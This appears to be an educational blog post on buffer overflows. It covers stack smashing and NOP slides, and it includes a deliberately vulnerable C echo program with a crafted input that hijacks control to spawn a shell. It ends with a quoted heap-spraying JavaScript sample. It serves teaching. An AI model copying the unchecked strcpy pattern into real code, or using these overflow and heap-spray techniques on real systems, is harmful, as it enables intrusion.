---
date: "2018-12-31"
title: "Buffer Overflows"
category: "Security"
---

Buffer overflows is one of most common bugs in C/C++ programs.
<br />
Let's talk about some common buffer overflows.
<div>
  <img 
    src='https://media.giphy.com/media/l2JJNISY3AgGENJzq/giphy.gif' 
    style="height: 50%; width:50%"
  >
</div>

### Stack Smashing

> What are buffer overflows ?

Consider the web server contains a function
```c
void func(char *str) {
  char buff[128];
  strcpy(buf, str);
  do-something(buf);
}
```
Let's look at the stack
<div>
  <img 
    src='https://storage.googleapis.com/warrenlee/myBlog/buffer%20overflows/stack1.jpg' 
    style="height: 80%; width:80%"
  >
</div>
When func is called, a stack frame is created for this function.
<br />
Then the return address is pushed onto the stack.
<br />
Stack frame pointer is like linked list, chaining to the top of stack.
<br />
buf is initialized as size of 128 bytes, and strcpy will copy the input string into this local buffer.
<br />
<br />

> What happens if the argument is more than 128 bytes ?

The input string would overflow the buffer and overwrite return address.
<div>
  <img 
    src='https://storage.googleapis.com/warrenlee/myBlog/buffer%20overflows/stack2.jpg' 
    style="height: 80%; width:80%"
  >
</div>
<br />
So this function is not gonna return where its supposed to return.
<br />
This kind of attack is also called 'Control Hijacking Attack'.
<br />
<br />

> But, how does attacker determine return address ?

#### SolutionL: NOP slide
<div>
  <img 
    src='https://storage.googleapis.com/warrenlee/myBlog/buffer%20overflows/NOP-slide.jpg' 
    style="height: 60%; width:60%"
  >
</div>
<br />
Since attacker doesn't know the address of program P, 
what he would do is jump to random address and create a NOP slide (a sequence of no-op operations).

And use NOP slides to tell if the overflow hits the target return address.

### Simple Exercise
In this example, 
we are going to see how attacker can take over the system 
by using stack smashing attack.

#### utils.h
```c
#ifndef UTILS_H
#define UTILS_H

// Takes a string literal and replaces hex characters
// '\xAA' with their true hex value.
char *hexify_str(char *str);

#endif
```

#### target.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "target.h"
#include "utils.h"

#define BUF_SIZE 16

int bar(char *arg, char *out)
{
  strcpy(out, arg);
  return 0;
}

void baz(char *word)
{
  printf("You said: %s\n", word);  
}

void dontcall(int skip_reset) {
  static int ct = 0;
  if (!skip_reset) {
    ct = 0;
    return;
  }
  ct += 1;
  if (ct == 2) {
  	system("/bin/sh");
  }
}

void echo(char *word)
{
  dontcall(0);
  void (*printer)(char *);
  char buf[BUF_SIZE];
  for (int i = 0; i < BUF_SIZE; i++) {
    buf[i] = '\0';
  }
  
  hexify_str(word);
  printer = &baz;
  bar(word, buf);
  printer(buf);
}

void print_func_digest() {
  printf("Function digest: \n");
  printf("  bar      is at address: %p\n", bar);
  printf("  baz      is at address: %p\n", baz);
  printf("  dontcall is at address: %p\n", dontcall);
  printf("  echo     is at address: %p\n", echo);
}
```

#### main.c
```c
#include <stdio.h>
#include <string.h>
#include "target.h"

#define INPUT_SIZE 64

int main(void)
{
	
  char input[INPUT_SIZE];
  printf("Welcome! I echo what you say. Enter Ctrl-C to stop the program.\n\n");
  print_func_digest();
  printf("\n");
  while (1) {
    printf("------------------------------\n");
    printf("Your input: ");
    fgets(input, INPUT_SIZE, stdin);
    /* Remove newline */
    input[strcspn(input, "\n")] = 0;
  	echo(input);
  }
}
```

Execute the program and the print out is
```
Welcome! I echo what you say. Enter Ctrl-C to stop the program.

Function digest:
  bar       is at address: 0x80485cf
  baz       is at address: 0x80485e7
  dontcall  is at address: 0x80485fd
  echo      is at address: 0x8048638

------------------------------
Your input:
```

Within the loop, the process flow is 
1. get input stream and store it to a input buffer.
2. preprocessing
3. execute 'echo' function, which copies input buffer to the other buffer with size of 16 bytes
4. postprocessing

> What if the input is '1...2...3...4...\xfd\x85\x04\x08.123.123\xe7\x85\x04\x08'

<b>
  The first 16 bytes fulfill the buffer,
  <br />
  next 4 bytes overwrite the function pointer with the address dontcall,
  <br />
  next 4 bytes are local variable (int i), 
  <br />
  and next 4 bytes take care of stack frame pointer.
  <br />
  And finally the rest overwrites return address.  
  </br>
</b>

<div>
  <img 
    src='https://storage.googleapis.com/warrenlee/myBlog/buffer%20overflows/stack.jpg' 
    style="height: 80%; width:80%"
  >
</div>

Then we receive a shell prompt

<div>
  <img 
    src='https://media.giphy.com/media/102h4wsmCG2s12/giphy.gif' 
    style="height:50%; width:50%"
  >
</div>

### Heap Spraying

According to http://www.fuzzysecurity.com/tutorials/expDev/8.html
> The concept of "heap spraying" was first introduced by blazde and SkyLined in 2004 when it was used in the Internet Explorer iframe tag buffer overflow exploit. This same generic technique has been used by most browser exploits up to IE7, firefox 3.6.24, Opera 11.60.

The idea is basically to spray heap with shell code. 
And it would increase the possibility for buffer overflow to execute those shell code.
<div>
  <img 
    src='https://storage.googleapis.com/warrenlee/myBlog/buffer%20overflows/heap-spraying.jpg' 
    style="height:60%; width:60%"
  >
</div>

### Sample JS code

```html
<html>
  <body>
    <script language='javascript'>
      var Shellcode = unescape(
      '%u7546%u7a7a%u5379'+   // ASCII
      '%u6365%u7275%u7469'+   // FuzzySecurity
      '%u9079');              //
      
      var NopSlide = unescape('%u9090%u9090');
        
      var headersize = 20;
      var slack = headersize + Shellcode.length;
        
      while (NopSlide.length < slack) NopSlide += NopSlide;
      var filler = NopSlide.substring(0,slack);
      var chunk = NopSlide.substring(0,NopSlide.length - slack);
        
      while (chunk.length + slack < 0x40000) chunk = chunk + chunk + filler;
      var memory = new Array();
      // The goal is to fill the heap with sequences of NOP's + Shellcode.
      for (i = 0; i < 500; i++){ memory[i] = chunk + Shellcode }

      alert("allocation done");
    </script>
  </body>
</html>
```

